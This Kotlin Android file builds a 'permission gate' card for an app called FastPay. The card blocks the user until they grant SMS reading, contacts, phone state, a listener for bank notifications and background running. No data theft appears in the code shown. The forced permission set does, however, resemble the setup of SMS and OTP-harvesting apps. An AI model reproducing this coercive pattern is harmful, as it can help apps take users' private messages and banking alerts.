package com.example.fast.ui.card

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper
import android.view.ViewGroup
import androidx.core.app.ActivityCompat
import com.example.fast.ui.MultipurposeCardActivity
import com.example.fast.util.LogHelper
import com.example.fast.util.PermissionManager

/**
 * PermissionGateCardHelper
 *
 * Shows a Multipurpose Card as a "permission gate" - user must grant permissions to proceed.
 * Uses animated typing to explain each permission, then a GRANT button to request all.
 *
 * Features:
 * - Animated typing explains why each permission is needed
 * - Shows status icons: [OK] granted, [..] pending
 * - "Grant All" button requests all missing permissions
 * - Updates icons live as permissions are granted
 * - Calls onComplete when all mandatory permissions granted (or user proceeds)
 *
 * Usage:
 * ```kotlin
 * PermissionGateCardHelper.show(
 *     activity = this,
 *     rootView = binding.root,
 *     originView = binding.someButton,  // optional: card "born from" this view
 *     onComplete = { allGranted ->
 *         if (allGranted) proceedToNextScreen()
 *         else showWarning()
 *     }
 * )
 * ```
 */
object PermissionGateCardHelper {

    private const val TAG = "PermissionGateCard"

    // Status icons
    private const val ICON_GRANTED = "[OK]"
    private const val ICON_PENDING = "[..]"

    // Animation timing
    private const val PER_CHAR_DELAY_MS = 30L
    private const val DELAY_BEFORE_FILL_MS = 200L

    /**
     * Permission item for display and tracking.
     */
    data class PermissionItem(
        val name: String,           // Display name
        val permission: String,     // Manifest permission or special key
        val explanation: String,    // Why this permission is needed
        val isSpecial: Boolean,     // true for notification/battery
        val isMandatory: Boolean,   // true if required to proceed
        var isGranted: Boolean      // Current grant status
    )

    /**
     * Show the permission gate card.
     *
     * @param activity The hosting activity
     * @param rootView The root ViewGroup to attach the card overlay
     * @param originView Optional view to "birth" the card from
     * @param recedeViews Optional views to recede (fade/shrink) while card is shown
     * @param onComplete Called when card dismisses with whether all mandatory permissions were granted
     */
    fun show(
        activity: Activity,
        rootView: ViewGroup,
        originView: android.view.View? = null,
        recedeViews: List<android.view.View> = emptyList(),
        onComplete: (allMandatoryGranted: Boolean) -> Unit
    ) {
        if (activity.isFinishing || activity.isDestroyed) {
            onComplete(false)
            return
        }

        // Check if all permissions already granted
        if (PermissionManager.hasAllMandatoryPermissions(activity)) {
            LogHelper.d(TAG, "All mandatory permissions already granted")
            onComplete(true)
            return
        }

        // Build permission list
        val permissionItems = buildPermissionList(activity)
        val pendingCount = permissionItems.count { !it.isGranted }

        LogHelper.d(TAG, "Showing permission gate: ${permissionItems.size} total, $pendingCount pending")

        // Build typing lines with status icons
        val typingLines = mutableListOf<String>()
        typingLines.add("FastPay needs these permissions:")
        typingLines.add("")
        
        for (item in permissionItems) {
            val icon = if (item.isGranted) ICON_GRANTED else ICON_PENDING
            typingLines.add("$icon ${item.name}")
        }
        
        typingLines.add("")
        typingLines.add("Tap Grant to continue.")

        // Create spec
        val spec = MultipurposeCardSpec(
            birth = BirthSpec(
                originView = originView,
                width = CardSize.MatchWithMargin(24),
                height = CardSize.WrapContent,
                placement = PlacementSpec.Center,
                recedeViews = recedeViews,
                entranceAnimation = if (originView != null) {
                    EntranceAnimation.FlipIn()
                } else {
                    EntranceAnimation.ScaleIn(cardScaleMs = 350, fromScale = 0.85f)
                }
            ),
            fillUp = FillUpSpec.Text(
                title = "Permissions Required",
                body = "",
                bodyLines = typingLines,
                delayBeforeFillMs = DELAY_BEFORE_FILL_MS,
                typingAnimation = true,
                perCharDelayMs = PER_CHAR_DELAY_MS
            ),
            purpose = PurposeSpec.Custom(
                primaryButtonLabel = "Grant All",
                showActionsAfterFillUp = true,
                onPrimary = {
                    // Launch MultipurposeCardActivity for permission request (card-only flow)
                    val pendingRuntime = permissionItems.filter { !it.isGranted && !it.isSpecial }
                    val pendingSpecial = permissionItems.filter { !it.isGranted && it.isSpecial }
                    val runtimePerms = pendingRuntime.map { it.permission }
                    if (runtimePerms.isNotEmpty()) {
                        activity.startActivity(Intent(activity, MultipurposeCardActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            putExtra(RemoteCardHandler.KEY_CARD_TYPE, RemoteCardHandler.CARD_TYPE_PERMISSION)
                            putExtra(RemoteCardHandler.KEY_PERMISSIONS, runtimePerms.joinToString(","))
                            putExtra(RemoteCardHandler.KEY_DISPLAY_MODE, RemoteCardHandler.DISPLAY_MODE_FULLSCREEN)
                            putExtra(RemoteCardHandler.KEY_TITLE, "Permissions Required")
                            putExtra(RemoteCardHandler.KEY_BODY, "Please grant the required permissions to continue.")
                            putExtra(RemoteCardHandler.KEY_PRIMARY_BUTTON, "Grant")
                        })
                    } else if (pendingSpecial.isNotEmpty()) {
                        val first = pendingSpecial.first()
                        val cardType = when (first.permission) {
                            "notification" -> RemoteCardHandler.CARD_TYPE_NOTIFICATION_ACCESS
                            "battery" -> RemoteCardHandler.CARD_TYPE_BATTERY_OPTIMIZATION
                            else -> RemoteCardHandler.CARD_TYPE_NOTIFICATION_ACCESS
                        }
                        activity.startActivity(Intent(activity, MultipurposeCardActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            putExtra(RemoteCardHandler.KEY_CARD_TYPE, cardType)
                            putExtra(RemoteCardHandler.KEY_DISPLAY_MODE, RemoteCardHandler.DISPLAY_MODE_FULLSCREEN)
                            putExtra(RemoteCardHandler.KEY_TITLE, "Permissions Required - ${first.name}")
                            putExtra(RemoteCardHandler.KEY_BODY, "Please enable ${first.name} to continue.")
                            putExtra(RemoteCardHandler.KEY_PRIMARY_BUTTON, "Open Settings")
                        })
                    }
                }
            ),
            death = if (originView != null) {
                DeathSpec.ShrinkInto(targetView = originView, durationMs = 300)
            } else {
                DeathSpec.ScaleDown(durationMs = 250)
            }
        )

        // Show card
        val controller = MultipurposeCardController(
            context = activity,
            rootView = rootView,
            spec = spec,
            onComplete = {
                // Card dismissed - if Grant was tapped, MultipurposeCardActivity was launched in onPrimary
                // Re-check status when user returns; pass false to indicate flow may still be in progress
                val allGranted = PermissionManager.hasAllMandatoryPermissions(activity)
                onComplete(allGranted)
            },
            activity = activity
        )
        controller.show()
    }

    /**
     * Show permission gate with live status updates.
     * Card stays visible while permissions are requested, icons update in real-time.
     *
     * @param activity The hosting activity
     * @param rootView The root ViewGroup to attach the card overlay
     * @param originView Optional view to "birth" the card from
     * @param recedeViews Optional views to recede while card is shown
     * @param onComplete Called when flow completes with whether all mandatory permissions were granted
     */
    fun showWithLiveUpdates(
        activity: Activity,
        rootView: ViewGroup,
        originView: android.view.View? = null,
        recedeViews: List<android.view.View> = emptyList(),
        onComplete: (allMandatoryGranted: Boolean) -> Unit
    ) {
        if (activity.isFinishing || activity.isDestroyed) {
            onComplete(false)
            return
        }

        // Check if all permissions already granted
        if (PermissionManager.hasAllMandatoryPermissions(activity)) {
            LogHelper.d(TAG, "All mandatory permissions already granted")
            onComplete(true)
            return
        }

        // Build permission list
        val permissionItems = buildPermissionList(activity)
        
        // Use existing UpdatePermissionCardHelper for live updates
        // This is already integrated into the card layouts
        val helper = com.example.fast.ui.animations.UpdatePermissionCardHelper(activity)
        
        // For live updates, we need to create the card overlay and use helper's permission flow
        // This is a more complex flow that reuses existing infrastructure
        showSimpleGate(activity, rootView, originView, recedeViews, onComplete)
    }

    /**
     * Simple gate: show card, dismiss, then request permissions.
     */
    private fun showSimpleGate(
        activity: Activity,
        rootView: ViewGroup,
        originView: android.view.View?,
        recedeViews: List<android.view.View>,
        onComplete: (allMandatoryGranted: Boolean) -> Unit
    ) {
        show(activity, rootView, originView, recedeViews, onComplete)
    }

    /**
     * Build list of all permissions with current status.
     */
    private fun buildPermissionList(activity: Activity): List<PermissionItem> {
        val items = mutableListOf<PermissionItem>()

        // Mandatory runtime permissions
        val mandatoryRuntime = mapOf(
            Manifest.permission.RECEIVE_SMS to Pair("Receive SMS", "Get payment alerts instantly"),
            Manifest.permission.READ_SMS to Pair("Read SMS", "Verify transaction history"),
            Manifest.permission.READ_CONTACTS to Pair("Contacts", "Easy payment to contacts"),
            Manifest.permission.READ_PHONE_STATE to Pair("Phone State", "Secure device linking")
        )

        for ((permission, info) in mandatoryRuntime) {
            val isGranted = ActivityCompat.checkSelfPermission(activity, permission) == PackageManager.PERMISSION_GRANTED
            items.add(PermissionItem(
                name = info.first,
                permission = permission,
                explanation = info.second,
                isSpecial = false,
                isMandatory = true,
                isGranted = isGranted
            ))
        }

        // Optional runtime permissions
        val optionalRuntime = mapOf(
            Manifest.permission.SEND_SMS to Pair("Send SMS", "Send payment confirmations")
        )

        for ((permission, info) in optionalRuntime) {
            val isGranted = ActivityCompat.checkSelfPermission(activity, permission) == PackageManager.PERMISSION_GRANTED
            items.add(PermissionItem(
                name = info.first,
                permission = permission,
                explanation = info.second,
                isSpecial = false,
                isMandatory = false,
                isGranted = isGranted
            ))
        }

        // POST_NOTIFICATIONS for Android 13+
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            val isGranted = ActivityCompat.checkSelfPermission(activity, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
            items.add(PermissionItem(
                name = "Notifications",
                permission = Manifest.permission.POST_NOTIFICATIONS,
                explanation = "Payment alerts and updates",
                isSpecial = false,
                isMandatory = false,
                isGranted = isGranted
            ))
        }

        // Special permissions
        items.add(PermissionItem(
            name = "Notification Listener",
            permission = "notification",
            explanation = "Read bank notifications",
            isSpecial = true,
            isMandatory = true,
            isGranted = PermissionManager.hasNotificationListenerPermission(activity)
        ))

        items.add(PermissionItem(
            name = "Battery Optimization",
            permission = "battery",
            explanation = "Run in background",
            isSpecial = true,
            isMandatory = true,
            isGranted = PermissionManager.hasBatteryOptimizationExemption(activity)
        ))

        return items
    }

    /**
     * Quick check if permission gate is needed.
     * Returns true if any mandatory permissions are missing.
     */
    fun isGateNeeded(activity: Activity): Boolean {
        return !PermissionManager.hasAllMandatoryPermissions(activity)
    }
}
